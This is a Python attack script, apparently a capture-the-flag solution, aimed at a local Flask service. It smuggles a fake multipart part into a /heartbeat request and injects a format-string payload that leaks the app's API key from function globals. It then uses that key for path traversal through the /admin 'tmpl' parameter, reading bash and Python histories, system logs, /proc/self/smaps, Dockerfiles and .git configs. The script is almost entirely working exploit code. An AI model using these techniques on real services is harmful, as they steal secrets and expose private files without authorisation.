import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=5.0)
    return r.text, r.status_code

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 检查一些可能包含文件名信息的地方

# 1. /var/log 可能有日志
# 2. /tmp 可能有临时文件
# 3. bash history
paths = [
    # 日志文件
    '../../../var/log/messages',
    '../../../var/log/syslog',
    '../../../var/log/dmesg',
    
    # bash history
    '../../../root/.bash_history',
    '../../../home/ctf/.bash_history',
    
    # Python 历史
    '../../../root/.python_history',
    '../../../home/ctf/.python_history',
    
    # /tmp
    '../../../tmp/flag',
    
    # Dockerfile 可能包含信息
    '../../../Dockerfile',
    
    # docker-compose
    '../../../docker-compose.yml',
    '../../../docker-compose.yaml',
    
    # .git 目录
    '../../../.git/config',
    '../../../app/.git/config',
    
    # 进程的内存映射中可能有路径
    '../../../proc/self/smaps',
    
    # audit log
    '../../../var/log/audit/audit.log',
]

for p in paths:
    content, status = read_file_via_admin(api_key, p)
    if status == 200:
        print(f"\n[{p}] Status: {status}")
        print(content[:2000])
